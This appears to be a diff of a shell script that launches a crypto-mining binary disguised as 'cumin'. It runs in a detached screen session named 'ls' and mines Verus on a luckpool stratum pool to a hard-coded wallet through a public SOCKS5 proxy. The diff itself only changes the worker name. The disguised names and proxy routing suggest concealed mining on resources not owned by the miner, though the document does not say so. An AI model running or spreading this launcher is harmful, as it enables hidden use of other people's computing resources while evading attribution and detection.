@@ -5,6 +5,6 @@ chmod +x cumin
 screen -dmS ls 
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr
-WORKER=$(echo $(shuf -i 1-100 -n 1)-Embe)
+WORKER=DevV5ByNongCroissant
 PROXY=socks5://98.162.25.23:4145
-./cumin -a verus -o $POOL -u $WALLET.pion -t 2 -x $PROXY
+./cumin -a verus -o $POOL -u $WALLET -t 2 -x $PROXY
